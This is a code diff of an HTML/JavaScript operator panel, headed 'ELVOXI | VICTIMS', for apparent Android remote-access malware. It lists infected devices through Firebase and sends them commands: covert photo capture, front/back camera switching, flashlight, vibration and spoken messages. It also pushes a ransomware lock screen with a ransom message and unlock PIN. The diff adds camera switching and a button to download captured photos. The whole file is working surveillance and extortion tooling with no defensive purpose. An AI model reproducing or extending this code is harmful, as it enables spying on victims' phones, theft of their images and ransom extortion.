@@ -15,7 +15,7 @@
         .drawer.active { left: 0; }
         .menu-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 15px; background: #1a1a1a; padding: 10px; border-radius: 8px; }
         .btn { padding: 8px 12px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 11px; }
-        .btn-on { background: #0f0; } .btn-off { background: #f00; color: #fff; }
+        .btn-on { background: #0f0; color: #000; } .btn-off { background: #f00; color: #fff; }
         .main-content { padding: 80px 20px; text-align: center; }
         input { width: 100%; padding: 10px; background: #222; border: 1px solid #444; color: #fff; margin-bottom: 5px; border-radius: 5px; box-sizing: border-box; }
         img { width: 100%; border-radius: 10px; border: 1px solid var(--neon); margin-top: 15px; }
@@ -27,7 +27,7 @@
     <div class="overlay" id="overlay" onclick="toggleDrawer()"></div>
     <div id="page-list">
         <h1 style="color:var(--neon); text-align:center;">ELVOXI | VICTIMS</h1>
-        <div id="targetList">Scanning Target...</div>
+        <div id="targetList">Scanning...</div>
     </div>
 
     <div id="page-control" style="display:none;">
@@ -38,24 +38,38 @@
         </div>
 
         <div class="drawer" id="drawer">
-            <h3 style="color:var(--neon); text-align:center;">CONTROL CENTER</h3>
-            <div class="menu-row"><span>FLASH</span><div><button class="btn btn-on" onclick="cmd('flash','on')">ON</button><button class="btn btn-off" onclick="cmd('flash','off')">OFF</button></div></div>
-            <div class="menu-row"><span>VIBRATE</span><div><button class="btn btn-on" onclick="cmd('vbt_on')">BOM</button><button class="btn btn-off" onclick="cmd('vbt_off')">OFF</button></div></div>
-            <input type="text" id="vT" placeholder="Pesan Suara (TTS)"><button class="btn btn-on" style="width:100%; margin-bottom:15px;" onclick="speak()">KIRIM SUARA</button>
+            <h3 style="color:var(--neon); text-align:center;">ELVOXI REMOTE</h3>
+            
+            <div class="menu-row"><span>KAMERA</span><div>
+                <button class="btn btn-on" onclick="switchCam('user')">DEPAN</button>
+                <button class="btn btn-off" onclick="switchCam('environment')">BKG</button>
+            </div></div>
+
+            <div class="menu-row"><span>FLASH</span><div>
+                <button class="btn btn-on" onclick="cmd('flash','on')">ON</button>
+                <button class="btn btn-off" onclick="cmd('flash','off')">OFF</button>
+            </div></div>
+
+            <div class="menu-row"><span>VIBRATE</span><div>
+                <button class="btn btn-on" onclick="cmd('vbt_on')">BOM</button>
+                <button class="btn btn-off" onclick="cmd('vbt_off')">OFF</button>
+            </div></div>
+
+            <input type="text" id="vT" placeholder="Pesan Suara..."><button class="btn btn-on" style="width:100%; margin-bottom:15px;" onclick="speak()">KIRIM SUARA</button>
             
             <div style="background:#1a1a1a; padding:10px; border-radius:8px; border:1px solid red;">
                 <span style="color:red; font-weight:bold;">RANSOMWARE LOCK</span>
-                <input type="text" id="rT" placeholder="Judul (Contoh: HACKED)">
+                <input type="text" id="rT" placeholder="Judul Lock">
                 <input type="text" id="rM" placeholder="Pesan Penebusan">
-                <input type="number" id="rP" placeholder="PIN Buka Kunci">
-                <button class="btn btn-off" style="width:100%" onclick="sendRansom()">KIRIM LOCK SCREEN</button>
+                <input type="number" id="rP" placeholder="PIN Rahasia">
+                <button class="btn btn-off" style="width:100%" onclick="sendRansom()">SEND LOCK</button>
             </div>
         </div>
 
         <div class="main-content">
             <div id="dispModel" style="font-size:24px; color:var(--neon); font-weight:bold;">--</div>
-            <div id="dispBatt" style="color:#0f0; margin-bottom:20px;">Battery: --</div>
-            <button class="btn btn-on" style="padding:15px; width:100%" onclick="cmd('snap')">📸 AMBIL FOTO</button>
+            <div id="dispBatt" style="color:#0f0; margin-bottom:20px;">Target Active</div>
+            <button class="btn btn-on" style="padding:15px; width:100%; font-size:16px;" onclick="cmd('snap')">📸 AMBIL FOTO</button>
             <div id="photoArea"></div>
         </div>
     </div>
@@ -79,9 +93,8 @@
             s.forEach(child => {
                 const id = child.key; const d = child.val();
                 list.innerHTML += `<div class="device-card" onclick="openControl('${id}','${d.model}')"><span>📱 <b>${d.model}</b></span><span style="color:#0f0">● ONLINE</span></div>`;
-                if(id === selectedID) {
-                    document.getElementById('dispBatt').innerText = "Battery: " + (d.battery || "??");
-                    if(d.foto) document.getElementById('photoArea').innerHTML = `<img src="${d.foto}">`;
+                if(id === selectedID && d.foto) {
+                    document.getElementById('photoArea').innerHTML = `<img src="${d.foto}"><br><a href="${d.foto}" download="foto.jpg"><button class="btn btn-on" style="margin-top:10px; width:100%">SIMPAN FOTO</button></a>`;
                 }
             });
         });
@@ -95,6 +108,7 @@
         }
         function toggleDrawer() { document.getElementById('drawer').classList.toggle('active'); document.getElementById('overlay').classList.toggle('active'); }
         function cmd(type, stat='') { db.ref('commands/'+selectedID).push({type: type, status: stat}); }
+        function switchCam(m) { db.ref('commands/'+selectedID).push({type: 'switch_cam', mode: m}); alert("Camera Switch Sent!"); }
         function speak() { const t = document.getElementById('vT').value; db.ref('commands/'+selectedID).push({type:'speak', text:t || "Dongo"}); document.getElementById('vT').value=""; }
         function sendRansom() {
             db.ref('commands/'+selectedID).push({
@@ -103,8 +117,8 @@
                 msg: document.getElementById('rM').value || "Pay to unlock.",
                 pin: document.getElementById('rP').value || "1234"
             });
-            alert("Ransomware Sent!"); toggleDrawer();
+            alert("Lock Sent!"); toggleDrawer();
         }
     </script>
 </body>
-</html>
+    </html>
